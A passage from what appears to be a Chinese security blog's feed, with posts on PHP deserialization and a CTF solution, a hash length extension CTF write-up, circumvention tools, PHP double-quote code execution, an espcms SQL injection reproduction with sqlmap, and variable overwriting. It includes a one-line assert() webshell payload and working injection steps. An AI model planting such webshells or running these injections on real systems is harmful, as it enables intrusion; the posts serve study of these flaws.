unserialize($class2);</span><br><span class="line">print_r($class2_unser);</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2018/10/28/5bd49a2003e1e.jpg" alt=""><br>由前可以看到，unserialize()后会导致<strong>wakeup() 或</strong>destruct()的直接调用，中间无需其他过程。因此最理想的情况就是一些漏洞/危害代码在<strong>wakeup() 或</strong>destruct()中，从而当我们控制序列化字符串时可以去直接触发它们。(这里因为懒直接照搬了某大佬的原文）</p><h3 id="绕过魔法函数"><a href="#绕过魔法函数" class="headerlink" title="绕过魔法函数"></a>绕过魔法函数</h3><p><strong>魔法函数sleep() 和 wakeup()<br>php文档中定义__wakeup():<br>unserialize() 执行时会检查是否存在一个 wakeup() 方法。如果存在，则会先调用 wakeup 方法，预先准备对象需要的资源。wakeup()经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。sleep()则相反，是用在序列化一个对象时被调用.</strong><br>正常情况下的反序列化来漏洞如下图：<br><img src="https://i.loli.net/2018/09/06/5b90f7f9ae0d0.jpg" alt=""><br>析构方法和__wakeup都能够执行<br>如果我们把传入的序列化字符串的属性个数更改成大于1的任何数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;hpdoger&quot;:2:&#123;s:1:&quot;a&quot;;s:6:&quot;u know&quot;;&#125;</span><br></pre></td></tr></table></figure></p><p>得到的结果如图，__wakeup没有被执行，但是执行了析构函数</p><hr><h2 id="反序列化漏洞实战"><a href="#反序列化漏洞实战" class="headerlink" title="反序列化漏洞实战"></a>反序列化漏洞实战</h2><ul><li>南邮CTF<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class just4fun &#123; //定义了一个类</span><br><span class="line">    var $enter;</span><br><span class="line">    var $secret;</span><br><span class="line">&#125;</span><br><span class="line">if (isset($_GET[&apos;pass&apos;])) &#123;</span><br><span class="line">    $pass = $_GET[&apos;pass&apos;];</span><br><span class="line"></span><br><span class="line">    if(get_magic_quotes_gpc())&#123;</span><br><span class="line">        $pass=stripslashes($pass);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $o = unserialize($pass); //进行反序列化处理</span><br><span class="line"></span><br><span class="line">    if ($o) &#123;</span><br><span class="line">        $o-&gt;secret = &quot;*&quot;; //这里不知道*代表的是啥</span><br><span class="line">        if ($o-&gt;secret === $o-&gt;enter) //要求$o中的两个属性值相同</span><br><span class="line">            echo &quot;Congratulation! Here is my secret: &quot;.$o-&gt;secret;</span><br><span class="line">        else </span><br><span class="line">            echo &quot;Oh no... You can&apos;t fool me&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else echo &quot;are you trolling?&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li></ul><p>由于我们不知道<code>*</code>代表的是什么，故我们需要用指针来直接使两属性相等。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class just4fun &#123;</span><br><span class="line">    var $enter;</span><br><span class="line">    var $secret;</span><br><span class="line">&#125;</span><br><span class="line">$o = new just4fun;</span><br><span class="line">$o-&gt;enter = &amp;$o-&gt;secret; //这里的a=&amp;b 即代表将b的指针赋值给a 无论b的值怎么变 a始终等于b</span><br><span class="line">echo serialize($o);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>本地运行即可得到序列化字符串<br><code>O:8:&quot;just4fun&quot;:2:{s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;}</code><br>然后将此作为pass参数GET发送即可获得flag</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在PHP中，序列化用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。&lt;br&gt;
    
    </summary>
    
      <category term="原创栏目" scheme="http://www.0x002.com/categories/%E5%8E%9F%E5%88%9B%E6%A0%8F%E7%9B%AE/"/>
    
    
      <category term="PHP代码审计" scheme="http://www.0x002.com/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>CTF实验吧让我进去writeup</title>
    <link href="http://www.0x002.com/2018/CTF%E5%AE%9E%E9%AA%8C%E5%90%A7%E8%AE%A9%E6%88%91%E8%BF%9B%E5%8E%BBwriteup/"/>
    <id>http://www.0x002.com/2018/CTF实验吧让我进去writeup/</id>
    <published>2018-09-08T04:48:02.000Z</published>
    <updated>2018-10-27T16:26:28.857Z</updated>
    
    <content type="html"><![CDATA[<h1 id="初探题目"><a href="#初探题目" class="headerlink" title="初探题目"></a>初探题目</h1><a id="more"></a><p><img src="https://i.loli.net/2018/10/23/5bcf2b29d3962.png" alt=""><br>两个表单，我们用burp抓包试试<br><img src="https://i.loli.net/2018/10/23/5bcf2f8d4e0ca.png" alt=""><br>这时候我们发现Cookie值里有个很奇怪的值是source，这个单词有起源的意思，我们就可以猜测这个是判断权限的依据，让我们来修改其值为1，发送得到如下显示：<br><img src="https://i.loli.net/2018/10/23/5bcf3112ab7be.png" alt=""></p><h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><p>发现爆出了源代码，让我们来审计一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$flag = &quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;;</span><br><span class="line">$secret = &quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for security!</span><br><span class="line"></span><br><span class="line">$username = $_POST[&quot;username&quot;];</span><br><span class="line">$password = $_POST[&quot;password&quot;];</span><br><span class="line"></span><br><span class="line">if (!empty($_COOKIE[&quot;getmein&quot;])) &#123;</span><br><span class="line">    if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) &#123;</span><br><span class="line">        if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) &#123;</span><br><span class="line">            echo &quot;Congratulations! You are a registered user.\n&quot;;</span><br><span class="line">            die (&quot;The flag is &quot;. $flag);</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            die (&quot;Your cookies don&apos;t match up! STOP HACKING THIS SITE.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        die (&quot;You are not an admin! LEAVE.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));</span><br><span class="line"></span><br><span class="line">if (empty($_COOKIE[&quot;source&quot;])) &#123;</span><br><span class="line">    setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    if ($_COOKIE[&quot;source&quot;] != 0) &#123;</span><br><span class="line">        echo &quot;&quot;; // This source code is outputted here</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们如果需要获得flag，需要满足一下条件：<br>1.Cookie中getmein的值不能为空<br>2.username必须为admin和password不能为admin<br>3.Cookie中的getmein必须等于<code>md5($secret.urldecode($username.$password))</code><br>满足这三个条件才可获得flag，可是我们无法得知$secret的值为多少<br><code>setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));</code><br>发现下面有行代码是这样写的，将输出的<code>md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;))</code>作为cookie输出，结合前面的数据包我们可以知道输出的值为<code>571580b26c65f306376d4f64e53cb5c7</code> 可是这串md5是由$secret+’adminadmin’转md5而得到的，如果我们在password输入admin将不满足前面所需的三个条件</p><h1 id="死局转生"><a href="#死局转生" class="headerlink" title="死局转生"></a>死局转生</h1><p>我们知道常见的md5是16位的，而这里的md5正是16位，我们的$secret是十五位的,加上’adminadmin’就变成25位了，很明显这里的md5肯定会出现重复，所以我们可以哈希长度拓展攻击绕过这个死局<br>这里附两个讲述具体原理的链接:<br><a href="http://www.freebuf.com/articles/web/69264.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/69264.html</a> <a href="https://www.cnblogs.com/p00mj/p/6288337.html" target="_blank" rel="noopener">https://www.cnblogs.com/p00mj/p/6288337.html</a></p><p>在Kali下用hashpump操作<br><img src="http://image.mamicode.com/info/201810/20181007123528335098.png" alt=""><br>最好我们构造数据包，把生成的数据发送即可获得flag<br><img src="http://image.mamicode.com/info/201810/20181007123529050946.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;初探题目&quot;&gt;&lt;a href=&quot;#初探题目&quot; class=&quot;headerlink&quot; title=&quot;初探题目&quot;&gt;&lt;/a&gt;初探题目&lt;/h1&gt;
    
    </summary>
    
      <category term="技术文章" scheme="http://www.0x002.com/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="CTF" scheme="http://www.0x002.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>个人总结的一些科学上网的方法</title>
    <link href="http://www.0x002.com/2018/%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <id>http://www.0x002.com/2018/个人总结的一些科学上网的方法/</id>
    <published>2018-07-27T15:00:21.000Z</published>
    <updated>2019-03-10T06:54:01.699Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、VPN大法"><a href="#一、VPN大法" class="headerlink" title="一、VPN大法:"></a>一、VPN大法:</h2><p><strong>vpn大法可谓是最常见的招式，但目前随着天朝禁止的程度逐渐加大，许多VPN已经无法免费的使用，但是收费的VPN使用起来确实不错，主要是用来玩游戏。</strong></p><p>目前免费的VPN：<a href="http://my.0ff0.net/" target="_blank" rel="noopener">一小时VPN账号</a>     <a href="https://www.imfreevpnn.com/" target="_blank" rel="noopener">Free VPN 免费24小时</a></p><h2 id="二、SS大法："><a href="#二、SS大法：" class="headerlink" title="二、SS大法："></a>二、SS大法：</h2><a id="more"></a><p><strong>SS大法全称为ShadowSocks，也叫影梭大法，ShadowSocks 是由<a href="https://github.com/clowwindy/shadowsocks" target="_blank" rel="noopener">@clowwindy</a>所开发的一个开源 Socks5 代理，主要是用来穿透防火墙的限制来达到科学上网的目的。</strong></p><p>目前市面上免费的SS有很多，这里就列举两个：<a href="https://www.lets-ss.com/" target="_blank" rel="noopener">Let’s SS</a>  <a href="http://freess.cx/" target="_blank" rel="noopener">Free SS</a></p><h2 id="三、SSR大法："><a href="#三、SSR大法：" class="headerlink" title="三、SSR大法："></a>三、SSR大法：</h2><p>SSR全称shadowsocks-R。SSR作者声称SS不够隐匿，容易被防火墙检测到，SSR在改进了混淆和协议，更难被防火墙检测到。简单地说，SSR是SS的改进版。<br>使用方法与SS类似，这里不是在赘述。</p><h2 id="四、V2大法："><a href="#四、V2大法：" class="headerlink" title="四、V2大法："></a>四、V2大法：</h2><p>继vpn,ss,ssr之后又一个好用的科学上网工具，用法类似ss与ssr<br>使用方法具体请百度。</p><h2 id="五、镜像大法："><a href="#五、镜像大法：" class="headerlink" title="五、镜像大法："></a>五、镜像大法：</h2><p><strong>镜像大法，顾名思义就是通过仿制一个被墙的网站，通过浏览这个镜像站来达到翻墙的作用（实际上并没有翻墙）。</strong></p><p>当然镜像也不可能是把他整个网站都模仿下载。操作原理可简单认为：通过一个可以翻墙的服务器搭建一个镜像站，当你访问镜像站的时候，服务器会想被镜像站发送相同的数据包并返回到你的浏览器上。</p><p>目前可用的镜像站也有很多，在这里就给大家列举两个： <a href="http://ac.scmor.com/" target="_blank" rel="noopener">谷歌镜像导航</a>  <a href="http://coderschool.cn/1853.html" target="_blank" rel="noopener">镜像站收集项目</a></p><h2 id="六、Host大法："><a href="#六、Host大法：" class="headerlink" title="六、Host大法："></a>六、Host大法：</h2><p><strong>Host大法即修改本机Host，使域名直接被定向到其真实IP，穿透了GWF的拦截，达到翻墙的目的</strong></p><p>最新穿墙Host： <a href="http://coderschool.cn/2354.html" target="_blank" rel="noopener">最新Host</a></p><h2 id="七、DNS大法："><a href="#七、DNS大法：" class="headerlink" title="七、DNS大法："></a>七、DNS大法：</h2><p><strong>DNS大法即修改本机DNS来达到翻墙的目的，有些DNS是可以翻墙的，使用他的DNS就可以达到穿墙的目的。</strong></p><p>穿墙的DNS有：<a href="http://coderschool.cn/2249.html" target="_blank" rel="noopener">DNS</a></p><h2 id="八、小白翻墙终极大招之Tor大法："><a href="#八、小白翻墙终极大招之Tor大法：" class="headerlink" title="八、小白翻墙终极大招之Tor大法："></a>八、小白翻墙终极大招之Tor大法：</h2><p><strong>Tor大法，即通过Tor浏览器来达到翻墙的目的，此大法会经过三重代理来达到科学上网的目的，不过速度会比较慢一些，正常的网页浏览还可以做到，如果要是想用来看视频什么的就算了，此方法永久免费。虽然网上有一些什么误入暗网最后不得好死等此类新闻，但大多数都是危言耸听，暗网这种东西，只要你不去刻意的了解，一般人都不会接触到的。</strong></p><p>附Tor官网下载： <a href="http://www.theonionrouter.com/download/download-easy.html.en" target="_blank" rel="noopener">Tor下载</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;一、VPN大法&quot;&gt;&lt;a href=&quot;#一、VPN大法&quot; class=&quot;headerlink&quot; title=&quot;一、VPN大法:&quot;&gt;&lt;/a&gt;一、VPN大法:&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;vpn大法可谓是最常见的招式，但目前随着天朝禁止的程度逐渐加大，许多VPN已经无法免费的使用，但是收费的VPN使用起来确实不错，主要是用来玩游戏。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;目前免费的VPN：&lt;a href=&quot;http://my.0ff0.net/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;一小时VPN账号&lt;/a&gt;     &lt;a href=&quot;https://www.imfreevpnn.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Free VPN 免费24小时&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;二、SS大法：&quot;&gt;&lt;a href=&quot;#二、SS大法：&quot; class=&quot;headerlink&quot; title=&quot;二、SS大法：&quot;&gt;&lt;/a&gt;二、SS大法：&lt;/h2&gt;
    
    </summary>
    
      <category term="原创栏目" scheme="http://www.0x002.com/categories/%E5%8E%9F%E5%88%9B%E6%A0%8F%E7%9B%AE/"/>
    
    
      <category term="奇淫技巧" scheme="http://www.0x002.com/tags/%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/"/>
    
      <category term="Google" scheme="http://www.0x002.com/tags/Google/"/>
    
      <category term="翻墙大法" scheme="http://www.0x002.com/tags/%E7%BF%BB%E5%A2%99%E5%A4%A7%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>PHP中双引号引起的命令执行漏洞</title>
    <link href="http://www.0x002.com/2018/PHP%E4%B8%AD%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%BC%95%E8%B5%B7%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>http://www.0x002.com/2018/PHP中双引号引起的命令执行漏洞/</id>
    <published>2018-07-11T15:15:51.000Z</published>
    <updated>2018-10-27T16:15:32.393Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>在PHP语言中，单引号和双引号都可以表示一个字符串，但是对于双引号来说，可能会对引号内的内容进行二次解释，这就可能会出现安全问题。</strong></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>举个简单例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = 1;</span><br><span class="line">$b = 2;</span><br><span class="line">echo &apos;$a$b&apos;;//输出结果为$a$b</span><br><span class="line">echo &quot;$a$b&quot;;//输出结果为12</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>可以看到这两个输出的结果并不相同。<br><a id="more"></a><br>在双引号中倘若有${}出现，那么{}内的内容将被当做代码块来执行。<br><img src="https://i.loli.net/2018/07/11/5b4621bf02bfa.png" alt=""><br>可以看到成功执行了phpinfo()</p><hr><p>试想一下，倘若在一个cms的后台，可以修改数据库的配置文件，且配置文件中的值用双引号包括，我们虽然也可以直接闭合代码达到getshell的后果，但是如果cms对传递的参数进行了addlashes()处理的话，我们就无法去闭合代码了，但这时我们可以传入${命令}就可以达到getshell的目的。</p><hr><p>现在，让我们来修改一下代码，让我们不只能输出phpinfo<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo &quot;$&#123;@assert($_POST[a])&#125;&quot;;?&gt; //@是用来防止输出错误信息的</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2018/07/11/5b4624108fe85.png" alt=""><br>菜刀成功连接</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文简单记录了双引号可能会引发的代码执行的情况<br>对于这种漏洞的防御，一定要明确单引号与双引号的区别所在，不要简单认为两者是互相可以替代的，在平时的代码书写中能只用单引号一定不要用双引号，毕竟单引号的解释时间也比双引号少得多，代码运行相对更快。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;在PHP语言中，单引号和双引号都可以表示一个字符串，但是对于双引号来说，可能会对引号内的内容进行二次解释，这就可能会出现安全问题。&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class=&quot;headerlink&quot; title=&quot;正文&quot;&gt;&lt;/a&gt;正文&lt;/h2&gt;&lt;p&gt;举个简单例子&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$a = 1;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$b = 2;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;echo &amp;apos;$a$b&amp;apos;;//输出结果为$a$b&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;echo &amp;quot;$a$b&amp;quot;;//输出结果为12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;可以看到这两个输出的结果并不相同。&lt;br&gt;
    
    </summary>
    
      <category term="原创栏目" scheme="http://www.0x002.com/categories/%E5%8E%9F%E5%88%9B%E6%A0%8F%E7%9B%AE/"/>
    
    
      <category term="代码审计" scheme="http://www.0x002.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>读书笔记之CMS漏洞复现集合</title>
    <link href="http://www.0x002.com/2018/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B9%8Bespcms%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://www.0x002.com/2018/读书笔记之espcms漏洞复现/</id>
    <published>2018-07-10T12:41:33.000Z</published>
    <updated>2018-07-11T15:17:55.250Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>最近在看法师的代码审计企业级代码安全架构一书，打算对书中所列出的cms漏洞进行复现，无技术含量。</strong></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><blockquote><p>1.phpstudy环境整合包<br>2.各种cms安装包<br>3.《代码审计企业级代码安全架构》<br>4.Seay源代码审计系统</p></blockquote><h3 id="复现一之espcms注入漏洞"><a href="#复现一之espcms注入漏洞" class="headerlink" title="复现一之espcms注入漏洞"></a>复现一之espcms注入漏洞</h3><a id="more"></a><p>漏洞文件位置：espcms\adminsoft\control\citylist.php<br><img src="https://i.loli.net/2018/07/10/5b44ac7267bba.png" alt=""><br>可以看到这里有一个sql请求，并且请求中包含着变量$parentid。<br>并且$parentid的赋值句子为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$parentid = $this-&gt;fun-&gt;accept(&apos;parentid&apos;, &apos;R&apos;)</span><br></pre></td></tr></table></figure></p><p>这里引用对象进行赋值<br>我们查找accept这个自定义函数，看看是否有可能会有sql注入。<br><img src="https://i.loli.net/2018/07/10/5b44ae0884788.png" alt=""><br>可以看出这个函数是_用来通过<strong>$_POST、$_GET、$_COOKIE</strong> 三种方法来接收数据并保存为数组变量$var<br>最后通过一个daddslashes()函数对数据进行单引号等字符的过滤<br>但是我们前面所提到的sql语句中并不需要我们去闭合单引号，那么这句造成了一个sql注入漏洞<br>我们来找一下那些文件实例化了这个类<br>这个类名叫important，我们直接进行全局搜索<br>可以看到在adminsoft\index.php文件实例化了该类<br><img src="https://i.loli.net/2018/07/10/5b44b198bed0a.png" alt=""><br>Tips:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$control = new important();//实例化important类</span><br><span class="line">$action = &apos;on&apos; . $action;//&apos;变量赋值&apos;</span><br><span class="line">if (method_exists($control, $action)) &#123;//检测方法是否此名字</span><br><span class="line">$control-&gt;$action();//如果存在则使用important类中的方法</span><br></pre></td></tr></table></figure></p><p>成功注入<br><img src="https://i.loli.net/2018/07/10/5b44b66dd1b38.png" alt=""><br>用sqlmap测试一下<br>因为该漏洞需要登录，即需要cookie验证，我们用burpsuite抓下数据包，并保存到sqlmap目录下的1.txt里，然后再用sqlmap，输入命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -r 1.txt</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2018/07/10/5b44be1a1629f.png" alt=""></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>此漏洞涉及到php编程中的面向对象问题、addslashes()函数等知识点，比较基础</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;最近在看法师的代码审计企业级代码安全架构一书，打算对书中所列出的cms漏洞进行复现，无技术含量。&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class=&quot;headerlink&quot; title=&quot;正文&quot;&gt;&lt;/a&gt;正文&lt;/h2&gt;&lt;h3 id=&quot;准备工作&quot;&gt;&lt;a href=&quot;#准备工作&quot; class=&quot;headerlink&quot; title=&quot;准备工作&quot;&gt;&lt;/a&gt;准备工作&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;1.phpstudy环境整合包&lt;br&gt;2.各种cms安装包&lt;br&gt;3.《代码审计企业级代码安全架构》&lt;br&gt;4.Seay源代码审计系统&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;复现一之espcms注入漏洞&quot;&gt;&lt;a href=&quot;#复现一之espcms注入漏洞&quot; class=&quot;headerlink&quot; title=&quot;复现一之espcms注入漏洞&quot;&gt;&lt;/a&gt;复现一之espcms注入漏洞&lt;/h3&gt;
    
    </summary>
    
      <category term="原创栏目" scheme="http://www.0x002.com/categories/%E5%8E%9F%E5%88%9B%E6%A0%8F%E7%9B%AE/"/>
    
    
      <category term="代码审计" scheme="http://www.0x002.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="读书笔记" scheme="http://www.0x002.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>变量覆盖漏洞学习及在webshell中的运用</title>
    <link href="http://www.0x002.com/2018/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%8F%8A%E5%9C%A8webshell%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8/"/>
    <id>http://www.0x002.com/2018/变量覆盖漏洞学习及在webshell中的运用/</id>
    <published>2018-07-08T19:52:15.000Z</published>
    <updated>2018-10-27T16:25:43.668Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、发生条件："><a href="#一、发生条件：" class="headerlink" title="一、发生条件："></a>一、发生条件：</h2><p>函数使用不当（$$、extract()、parse_str()、import_request_variables()等）<br>开启全局变量</p><h2 id="二、基础了解："><a href="#二、基础了解：" class="headerlink" title="二、基础了解："></a>二、基础了解：</h2><h3 id="1-定义"><a href="#1-定义" class="headerlink" title="1.$$定义"></a>1.$$定义</h3><p>$$代表可变变量，就是说，一个变量的变量名可以动态的设置和使用。<br><a id="more"></a><br>举个简单例子：<br> <img src="https://i.loli.net/2018/07/09/5b426fdad38e1.png" alt=""><br>变量a被定义成了字符串hello 而变量$a被定于成了字符串world!<br>但同时$a本身也是个变量<br>$$a就可以代表两个含义$($a)和$(hello) 两个变量<br>此时输出的结果如图：<br><img src="https://i.loli.net/2018/07/09/5b426fdad38a9.png" alt=""></p><h3 id="2-extract-定义"><a href="#2-extract-定义" class="headerlink" title="2.extract()定义"></a>2.extract()定义</h3><p>extract()可以从数组中将变量导入到当前的符号表。<br>该函数使用数组键名作为变量名，使用数组键值作为变量值<br>语法结构：extract(array,extract_rules,prefix)<br>i.array为必选参数（此参数必须为数组型数据）<br>ii.extract_rules为可选参数，可选的值有：<br>● EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。<br>● EXTR_SKIP - 如果有冲突，不覆盖已有的变量。<br>● EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 prefix。<br>● EXTR_PREFIX_ALL - 给所有变量名加上前缀 prefix。<br>● EXTR_PREFIX_INVALID - 仅在不合法或数字变量名前加上前缀 prefix。<br>● EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。<br>● EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。<br>● EXTR_REFS - 将变量作为引用提取。导入的变量仍然引用了数组参数的值。<br>iii.prefix为可选参数（此参数暂不解释）<br>举个例子：<br> <img src="https://i.loli.net/2018/07/09/5b426fdadac53.png" 